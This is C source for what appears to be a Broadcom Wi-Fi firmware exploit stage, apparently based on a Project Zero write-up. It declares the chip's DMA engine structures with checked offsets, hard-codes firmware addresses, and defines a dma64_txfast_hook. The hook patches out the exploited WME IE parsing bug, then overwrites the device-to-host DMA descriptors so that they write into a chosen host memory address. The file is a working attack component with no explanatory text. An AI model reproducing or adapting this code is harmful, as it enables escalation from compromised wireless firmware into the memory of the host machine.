typedef _Bool bool;

typedef unsigned int uint;

typedef void(*di_fcn_t)();

typedef void si_t;
typedef unsigned char uint8;
typedef unsigned short uint16;
typedef unsigned int uint32;
typedef unsigned int dmaaddr_t;
typedef unsigned int u32;

/* export structure */
struct hnddma_pub {
	const di_fcn_t *di_fn;	/* DMA function pointers */
	uint txavail;		/* # free tx descriptors */
	uint dmactrlflags;	/* dma control flags */

	/* rx error counters */
	uint rxgiants;		/* rx giant frames */
	uint rxnobuf;		/* rx out of dma descriptors */
	/* tx error counters */
	uint txnobuf;		/* tx out of dma descriptors */
	uint filler;		/* the Linux kernel version is missing this field! */
};

/* dma registers per channel(xmt or rcv) */
typedef volatile struct {
	u32 control;		/* enable, et al */
	u32 ptr;		/* last descriptor posted to chip */
	u32 addrlow;		/* descriptor ring base address low 32-bits (8K aligned) */
	u32 addrhigh;	/* descriptor ring base address bits 63:32 (8K aligned) */
	u32 status0;		/* current descriptor, xmt state */
	u32 status1;		/* active descriptor, xmt error */
} dma64regs_t;

typedef volatile struct {
	dma64regs_t tx;		/* dma64 tx channel */
	dma64regs_t rx;		/* dma64 rx channel */
} dma64regp_t;

typedef volatile struct {	/* diag access */
	u32 fifoaddr;	/* diag address */
	u32 fifodatalow;	/* low 32bits of data */
	u32 fifodatahigh;	/* high 32bits of data */
	u32 pad;		/* reserved */
} dma64diag_t;

/*
 * DMA Descriptor
 * Descriptors are only read by the hardware, never written back.
 */
typedef volatile struct {
	u32 ctrl1;		/* misc control bits & bufcount */
	u32 ctrl2;		/* buffer count and address extension */
	u32 addrlow;		/* memory address of the date buffer, bits 31:0 */
	u32 addrhigh;	/* memory address of the date buffer, bits 63:32 */
} dma64dd_t;


#define MAXNAMEL	8		/* 8 char names */

/* dma engine software state */
typedef struct dma_info {
	struct hnddma_pub hnddma; /* exported structure */
	uint *msg_level;	/* message level pointer */
	char name[MAXNAMEL];	/* callers name for diag msgs */

	void *pbus;		/* bus handle */
	void *filler1;		/* The Linux kernel version is also missing this field! */

	bool dma64;		/* this dma engine is operating in 64-bit mode */
	bool addrext;		/* this dma engine supports DmaExtendedAddrChanges */

	union {
		struct {
			dma64regs_t *txregs_64;	/* 64-bit dma tx engine registers */
			dma64regs_t *rxregs_64;	/* 64-bit dma rx engine registers */
			dma64dd_t *txd_64;	/* pointer to dma64 tx descriptor ring */
			dma64dd_t *rxd_64;	/* pointer to dma64 rx descriptor ring */
		} d64_u;
	} dregs;
} dma_info_t;
#define offsetof __builtin_offsetof
// offsets from Project Zero's post
_Static_assert(offsetof(dma_info_t, name) == 0x20, "name offset fail");
_Static_assert(offsetof(dma_info_t, dregs.d64_u.txd_64) == 0x3c, "txd offset fail");

const uint wlc_bss_parse_wme_ie_addr = 0x1b8ad0;
const uint overwrite_addr_low = 0x81234;
const uint overwrite_addr_high = 0;

void dma64_txfast_hook(dma_info_t *di, void *p0, bool commit) {
	*((unsigned short*)wlc_bss_parse_wme_ie_addr) = 0x4770; // patch out the bug to prevent further damage
	uint* p = (uint*)(&di->name);
	if (*p != 0x00483244) return; // D2H
	dma64dd_t *txd_64 = di->dregs.d64_u.txd_64;
	for (;;) {
		if (txd_64->addrlow == 0xdeadbeef) break;
		txd_64->addrlow = overwrite_addr_low;
		txd_64->addrhigh = overwrite_addr_high;
		txd_64++;
	}
}
